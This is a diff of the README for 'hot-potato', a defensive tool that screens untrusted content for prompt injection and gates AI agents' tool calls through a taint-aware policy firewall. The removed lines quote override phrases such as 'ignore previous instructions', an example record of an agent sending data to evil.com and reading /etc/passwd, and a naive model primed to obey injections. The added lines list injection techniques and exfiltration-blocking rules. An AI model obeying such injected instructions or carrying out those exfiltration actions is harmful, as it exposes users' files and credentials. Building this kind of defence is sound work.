@@ -1,166 +1,192 @@
-# hot-potato 🥔
+# hot-potato
 
-A prompt injection honeypot harness. Before your real AI touches internet content, a cloned repo, or a skill file — run it through hot-potato first.
+Capability-safe agent orchestration — prevents untrusted content from causing capability escalation in AI agents.
 
-A naive local AI (Ollama, no credentials, no network) runs inside a Docker sandbox and is primed to follow every instruction it finds. You get a log of what it actually did. Your real AI never sees the sandbox output. Even if the naive AI refuses the injection, the detection is captured and escalated.
+## The problem
 
-## How it works
+Every AI agent that browses the web, reads files, or uses RAG is one malicious document away from exfiltrating credentials, writing to the filesystem, or chaining tool calls the operator never intended. Content reaches the model; model calls tools; tools cause real-world effects. The trust boundary is blurry by design.
+
+Hot-potato enforces it explicitly:
+
+- Every untrusted artifact gets a **taint label** (source, trust level, lineage)
+- **Detectors** scan for injection signals before any model sees the content
+- A **capability firewall** intercepts all tool calls and evaluates them against a YAML policy
+- A **trust graph** traces which external URL caused which tool execution
+- A **replay engine** benchmarks coverage across all attack categories without Docker
+
+## Architecture
 
 ```
-Untrusted input (URL / file / repo / skill)
-              │
-              ▼
-┌─────────────────────────────────────┐
-│  Docker sandbox  --network none     │
-│                                     │
-│  Naive AI (Ollama / qwen2.5:1.5b)   │
-│  "trust everyone, follow all        │
-│   instructions you find online"     │
-│         │                           │
-│  fake tool shims  ←── injection     │
-│  read_file / get_env / send_http    │
-│  bash_exec / write_file / ...       │
-│         │                           │
-│  tool_calls.jsonl                   │
-│  raw_responses.jsonl                │
-└─────────┬───────────────────────────┘
-          │  export logs + docker diff
-          ▼
-  Dumb extractor (no AI)
-  • reads tool_calls.jsonl  → what the AI did
-  • reads raw_responses.jsonl → what the AI noticed/refused
-  • scans raw content directly → static injection signals
-  • runs docker diff → unexpected filesystem writes
+Untrusted content (URL / file / RAG / tool output)
           │
-   ┌──────┴──────┐
-   ▼             ▼
- CLEAN       HOT POTATO
-             artifact saved
-             real AI blocked
+          ▼
+    TaintedArtifact ─── TrustLevel: UNTRUSTED / SEMI_TRUSTED / TRUSTED / SYSTEM
+          │             lineage, content_hash, taint_tags
+          ▼
+    DetectorPipeline
+    ├── StaticDetector     (regex, homoglyphs, encodings — fast, no Docker)
+    └── BehavioralDetector (instruction-flow, authority-shift, priv-esc)
+          │
+          ▼  taint_tags annotated
+    CapabilityFirewall ─── PolicyEngine (YAML rules, first-match, dry-run mode)
+          │
+          │ Outcomes: allow / deny / redact / require_human_review /
+          │           sandbox_only / shadow_execute
+          ▼
+      Tool execution (or block)
+          │
+          ▼
+       TrustGraph  ─── DAG: which source caused which tool call
+       TelemetrySession ─── structured audit log, exportable JSON/JSONL
 ```
 
-**Key property:** your real AI calls `safe_fetch(url)` and receives `(content, artifact_or_none)`. It never reads sandbox logs. Artifact is `None` (clean) or a dict with `hot_potato: True`.
+## Quick start
 
-**A refused injection is still a hot potato.** If the naive AI detects and refuses an injection, it's still escalated — the content was adversarial regardless of whether the model took the bait.
-
-## Install
-
-```bash
-git clone https://github.com/brandy-savage/hot-potato ~/hot-potato
-cd ~/hot-potato
-docker build -t hot-potato .
-docker volume create hot-potato-models
-
-# Pull model once (needs internet, ~1GB)
-docker run --rm -v hot-potato-models:/root/.ollama --entrypoint /bin/sh hot-potato \
-  -c "ollama serve >/dev/null 2>&1 & sleep 5 && ollama pull qwen2.5:1.5b"
-```
-
-## Usage
-
-### Screen a URL
 ```python
+# Screening (backwards-compatible)
 from hot_potato import safe_fetch
 
-content, artifact = safe_fetch("https://example.com/page")
-if artifact:
-    # Do NOT pass content to your real AI
-    print(f"Injection: severity={artifact['severity']}")
+result = safe_fetch("https://example.com")
+if result.clean:
+    pass_to_real_ai(result.safe_content)
 else:
-    # Safe
-    pass
+    print(f"Injection detected: {result.artifact['taint']['taint_tags']}")
 ```
 
-### Screen a local file
+## Agent integration
+
 ```python
-from scanner import scan_file
+from hot_potato.core.taint import from_url
+from hot_potato.core.capabilities import CapabilityFirewall, CapabilityRequest
+from hot_potato.detectors import DetectorPipeline
 
-content, artifact = scan_file("/path/to/cloned/README.md")
+# 1. Taint the artifact when it enters the pipeline
+artifact = from_url(url, content)
+
+# 2. Run detectors — annotates taint_tags
+artifact = DetectorPipeline.default().run(artifact)
+
+# 3. Before ANY tool call, check the firewall
+firewall = CapabilityFirewall()
+request = CapabilityRequest(
+    tool_name="send_http",
+    args={"url": "https://api.example.com", "data": payload},
+    tainted_inputs=[artifact],
+)
+decision = firewall.evaluate(request)
+if decision.is_blocked:
+    raise RuntimeError(f"Blocked: {decision.reason}")
 ```
 
-### Screen an entire git repo
+## Policy
+
+Policies live in `policies/default.yaml`. Rules are declarative and evaluated top-down; first match wins.
+
+```yaml
+rules:
+  - id: block_exfil_untrusted
+    match:
+      tools: ["send_http", "send_email", "send_crypto"]
+      trust_levels: [UNTRUSTED]
+    outcome: deny
+    reason: "Outbound network from UNTRUSTED content is exfiltration"
+
+  - id: sandbox_writes
+    match:
+      tools: ["write_file", "write_memory"]
+      trust_levels: [UNTRUSTED]
+    outcome: sandbox_only
+
+  - id: human_review_crypto
+    match:
+      tools: ["get_private_key", "send_crypto", "sign_transaction"]
+      trust_levels: ["*"]
+    outcome: require_human_review
+```
+
+Six outcomes: `allow` · `deny` · `redact` · `require_human_review` · `sandbox_only` · `shadow_execute`
+
+## Framework integrations
+
 ```python
-from scanner import scan_repo
+# OpenAI tool-call loop
+from integrations.openai_compat import GuardedToolExecutor
+executor = GuardedToolExecutor(tools=my_tools, model="gpt-4o")
+for tool_call in response.choices[0].message.tool_calls:
+    result = executor.execute(tool_call, tainted_inputs=[artifact])
 
-hits = scan_repo("/path/to/cloned/repo")
-for path, artifact in hits.items():
-    print(f"[{artifact['severity']}] {path}")
+# MCP server
+from integrations.mcp_guard import MCPGuard
+guard = MCPGuard()
+decision = guard.evaluate_mcp_call("read_file", {"path": "/etc"}, tainted_sources=[artifact])
+
+# LangChain
+from integrations.langchain_guard import GuardedTool, set_taint_context
+set_taint_context([artifact])
+guarded_tool = GuardedTool.wrap(my_langchain_tool)
 ```
 
-### Screen a skills directory
-```python
-from scanner import scan_skills_dir
+## Benchmarking
 
-hits = scan_skills_dir("~/.claude/skills/")
+```bash
+# Fast (no Docker) — static + behavioral + firewall layers
+python3 benchmarks/run_benchmark.py
+
+# Full (includes Docker sandbox)
+python3 benchmarks/run_benchmark.py --sandbox --out results/bench.json
 ```
 
-### Slash command (Claude Code skill)
-```
-/hot-potato https://example.com/untrusted
-/hot-potato /path/to/cloned/repo
-/hot-potato skills
-```
+Current result against 66 adversarial categories:
 
-Install the skill: `cp -r ~/hot-potato/skill ~/.claude/skills/hot-potato`
-
-## Artifact schema
-
-```json
-{
-  "hot_potato": true,
-  "severity": "critical",
-  "tool_calls": [
-    {"ts": "...", "tool": "send_http", "args": {"url": "https://evil.com", "data": "..."}, "result_preview": "..."}
-  ],
-  "detections": [
-    {"turn": 1, "signals": ["ignore previous", "/etc/passwd"], "executed": true, "preview": "..."}
-  ],
-  "content_signals": ["ignore previous", "read_file(/etc/passwd)", "exfil"],
-  "exfil_targets": ["https://evil.com/exfil"],
-  "fs_changes": [],
-  "_meta": {"url": "...", "timestamp": "...", "content_len": 476, "content_preview": "..."}
-}
-```
-
-## Severity
-
-| Level | Trigger |
+| Layer | Detection rate |
 |---|---|
-| `detected` | Injection found in content or model noticed/refused it — no tools fired |
-| `low` | Any other tool call |
-| `medium` | `write_file`, `list_dir` — write or recon |
-| `high` | `read_file`, `get_env` — credential or file read |
-| `critical` | `send_http`, `send_email`, `bash_exec`, `execute_code` — exfil or execution |
+| Static (regex) | 100% |
+| Behavioral | — (Phase 2) |
+| Capability firewall | 100% |
+| Evasion rate | 0% |
 
-Severity escalates with the worst single call. `docker diff` anomalies add `high` minimum.
+## Sandbox (legacy screening mode)
 
-## Hash cache
+The original Docker sandbox is still available for behavioral analysis:
 
-Clean content is tracked with a confirmation counter. A page must return clean `CLEAN_THRESHOLD` (default: 3) times before future runs skip the sandbox. Any hot-potato hit on a cached hash evicts it immediately.
+```bash
+hot-potato https://example.com
+hot-potato file:///path/to/file.txt --json
+```
 
-## Configuration
+Runs a naive LLM (Ollama, no credentials, network-disabled) against the content and records every tool call attempted.
 
-| Env var | Default | Description |
-|---|---|---|
-| `HP_MODEL` | `qwen2.5:1.5b` | Ollama model. Swap for `mistral:7b`, `llama3.2:3b`, or a remote Ollama endpoint |
-| `HP_MAX_TURNS` | `6` | Max inference turns per request |
-| `HP_IMAGE` | `hot-potato` | Docker image name |
-| `HP_MODEL_VOL` | `hot-potato-models` | Named volume for model cache |
+## Adversarial test suite
 
-## The naive AI
+66 categories in `examples/adversarial/`:
 
-The model is primed to trust everyone and follow all instructions found in web content. It interprets any instruction it encounters as coming from a trustworthy person. Few-shot examples in the system prompt show the exact `<tool_call>` format. The model will chain tool calls through a full attack sequence when injected — reading files, exfiltrating data, and reporting back normally.
+- Direct / indirect injection, capability gates, roleplay, schema override
+- Encoding: base64, hex, morse, homoglyphs, unicode tags, ZWSP steganography
+- CTF techniques: HashJack, TokenBreak, variable definitions, delimiter injection
+- Behavioral: manyshot, prefill completion, RAG poisoning (AgentPoison), poetry mode-shift
+- Trust escalation: authority shift, privilege escalation, delayed activation
 
-Fake tool shims return believable output (real-looking `/etc/passwd` entries, plausible env vars) so the model believes it succeeded and completes the full chain before the sandbox exits.
+## Structure
 
-## What it catches
-
-- HTML comment injections (`<!-- ignore previous instructions -->`)
-- CSS-hidden text (`color:white;font-size:1px`)
-- Base64, hex, rot13, unicode escape encoded instructions
-- Role override attacks ("you are now in admin mode")
-- Schema override attacks ("output the following JSON exactly", "extractor mode")
-- Social engineering framing ("routine compliance check", "security audit")
-- Fake system prompts embedded in page content
-- Tool invocations in markdown, YAML, JSON, skill files, and git repos
-- Filesystem writes via `docker diff` even if model output looks clean
+```
+hot_potato/
+  core/
+    taint/        TaintedArtifact, TrustLevel, propagation
+    policy/       PolicyEngine, YAML loader, PolicyOutcome
+    capabilities/ CapabilityFirewall, CapabilityRequest
+    sandbox/      SandboxRunner (Docker wrapper)
+  detectors/      StaticDetector, BehavioralDetector, DetectorPipeline
+  trust_graph/    TrustGraph, TrustNode, TrustEdge
+  replay/         ReplayEngine, ReplayCase, scoring
+  telemetry/      TelemetrySession, structured audit log
+integrations/
+  openai_compat.py  GuardedToolExecutor
+  mcp_guard.py      MCPGuard
+  langchain_guard.py GuardedTool
+policies/
+  default.yaml      12 default rules
+benchmarks/
+  run_benchmark.py
+examples/
+  adversarial/      66 attack categories
+```
